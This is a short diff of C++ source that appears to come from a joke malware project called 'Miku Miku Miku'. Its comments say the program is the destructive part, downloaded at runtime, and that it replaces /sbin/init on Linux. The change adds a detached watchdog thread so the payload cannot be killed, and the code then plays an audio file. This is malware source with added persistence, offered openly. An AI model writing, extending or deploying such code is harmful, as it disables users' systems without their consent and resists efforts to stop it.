@@ -22,12 +22,17 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 #include <cstdio>
 #include <unistd.h>
 #include <thread>
+#include "watchdog.h"
 
 // The destructive part of Miku Miku Miku, this gets downloaded on runtime.
 // This replaces /sbin/init on Linux distros.
 
 int main()
 {
+    // start watchdog service to make sure payload isn't killed.
+    std::thread ipc_thread(watchPayload);
+    ipc_thread.detach();
+
     // HATSUNE MIKU!!!!!!!!!!!!!!!!!
     system("mpv /miku/BD5972AA.ogg");
 
